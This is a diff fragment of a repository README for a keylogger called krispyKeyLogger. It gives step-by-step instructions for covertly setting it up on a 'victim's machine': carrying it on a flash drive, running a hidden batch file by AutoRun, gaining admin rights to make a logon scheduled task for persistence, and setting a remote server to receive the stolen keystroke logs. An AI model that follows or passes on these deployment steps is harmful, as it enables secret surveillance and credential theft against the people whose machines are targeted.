@@ -12,7 +12,7 @@ Requirements
 # Steps to setup krispyKeyLogger on victim's machine
 1) download this repo and also download python-3.7.0-amd64.exe from https://www.python.org/downloads/ and save it to victim directory
 2) you can carry victim directory in a removeable flash drive or download from web.
-3) change remote server path where you want to upload logs
+3) change remote server path where you want to upload logs (optinal).You can also change the path where the python script will be stored,then you need to also change python script location on task schedule command.
 4) execute hiddencmd.bat either by AutoRun or manually
   you will be requied to give administrative privileges to make a windows task schedule to execute krispyKeyLogger at logon,if privileges are not given the task will not be created.
 5) the deploy.bat fill will isntall python and two other python packages present in this directory.
